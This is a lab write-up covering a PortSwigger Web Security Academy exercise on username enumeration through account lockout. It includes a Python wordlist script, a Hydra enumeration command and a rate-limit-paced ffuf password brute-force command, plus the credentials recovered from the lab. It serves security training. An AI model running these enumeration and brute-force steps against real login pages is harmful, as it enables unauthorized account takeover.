# Username enumeration via account lock - PortSwigger Lab 21

**Severity:** Medium
**Target:**  https://0a6500af037d042b821370bf0056001c.web-security-academy.net

## Summary
The server blocks valid users after 5 times with incorrect passwords. 
This allows the attacker to enumerate valid users.
it also has a poorly rate limit protected, after blocking the account the rate limit resets in one minute


## Vulnerability Details
**Type:** Username enumeration via account lock and bypass via poorly rate limit protected
**Root Cause:** The server blocks valid users and unlocks after 1 minute without being exponential.
**Endpoint:**  https://0a6500af037d042b821370bf0056001c.web-security-academy.net/login

## Steps to Reproduce
1. First, create a Python script to repeat each user 5 times, and intentionally use the wrong password. This creates the wordlist to use in Hydra for enumeration.
2. After creating the wordlist, use Hydra with F=Invalid username or password. When the username is valid and the account locked,
   the server will return a different message that did not contain that string, so Hydra confirmed the user is valid.
3 . After finding the user, use ffuf to perform a brute force attack while respecting the blocking rate limit.

## Proof of Concept

script python wordlist range(5):


```python
with open('/home/luweed/Documents/wordusers.txt') as f:
    users = f.readlines()
    
with open('/home/luweed/Documents/multiplicada.txt', 'w') as f:
    for user in users:
        user = user.strip()
        for _ in range(5):
            f.write(f'{user}:senhawrong\n')
```

hydra attackline
```bash
hydra -C /home/luweed/Documents/multiplicada.txt \
0a6500af037d042b821370bf0056001c.web-security-academy.net \
https-post-form \
"/login:username=^USER^&password=^PASS^:F=Invalid username or password."

```

ffuf attackline

```bash
     ffuf -w /home/luweed/Documents/rockpass.txt:FUZZ \
     -u https://0a6500af037d042b821370bf0056001c.web-security-academy.net/login \
     -X POST \
     -d "username=applications&password=FUZZ" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -fc 200 \
     -t 1 \
     -p 15
```

## Result
applications:shadow
<br>
<br>
<img width="1917" height="1044" alt="image" src="https://github.com/user-attachments/assets/b8cbaa75-a37d-4a0b-b1db-deef10f46370" />
<br>
<br>
lab 29 too easy for PoC
<br>
<img width="1917" height="1044" alt="image" src="https://github.com/user-attachments/assets/71935272-b5a1-46cd-a31b-593f2f0f2e5c" />


## Impact

This vulnerability could lead to unauthorized account takeover. Access to the admin panel, data exposure, and the possibility of pivoting.

## Remediation
Add additional defense mechanisms such as CAPTCHA and permanent lockout.
